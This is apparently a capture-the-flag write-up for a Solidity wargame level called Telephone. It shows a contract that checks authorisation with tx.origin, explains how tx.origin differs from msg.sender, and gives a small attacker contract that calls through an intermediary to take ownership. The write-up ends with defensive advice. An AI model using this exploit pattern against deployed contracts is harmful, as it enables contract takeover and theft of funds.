# Telephone

## Challenge Statement

The goal is to transfer ownership of the contract to yourself.

## Analysis

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  // target function to change ownership
  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {  // to change ownership the tx.origin must not be the same as msg.sender
      owner = _owner;
    }
  }
}
```

What's the difference between tx.origin and msg.sender?

tx.origin = address of an account which is calling a smart contract’s function, only account address can be tx.origin.
msg.sender = address of an account or a smart contract which is directly calling a smart contract’s function.

This means if we deploy a smart contract and call a function in that smart contract which calls the target smart contract:
msg.sender = deployed smart contract address
tx.origin = our wallet address

## Solution

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface OGTelephone {
    function changeOwner(address _owner) external; 
}


contract T {
    address player_address = <player_address>;
    address target_contract = <target_contract_address>;

    function hack() public {
        OGTelephone(target_contract).changeOwner(player_address);
    }

}
```

## Moral 

Always use msg.sender when checking authorisation for the address calling a contract. Using tx.origin can lead for phishing attacks.